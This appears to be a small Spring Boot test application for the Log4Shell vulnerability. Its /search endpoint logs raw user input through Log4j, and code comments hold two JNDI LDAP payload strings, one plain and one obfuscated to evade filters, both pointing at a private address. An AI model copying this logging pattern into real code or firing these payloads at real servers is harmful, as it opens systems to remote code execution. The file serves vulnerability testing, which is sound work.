package com.log4jvultest.api;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
class Home {

    static Logger log = LogManager.getLogger(Home.class.getName());


  @GetMapping("/search")
  public String search(@RequestParam String query) {
    log.info("Search query: {}" , query);
    return query;
  }

  //naive form
  //${jndi:ldap://192.168.1.1:11111/safelocaltest}

  //other more complex forms
  //${j${lower:n}di:ldap://192.168.1.11:11111/safelocaltest}


}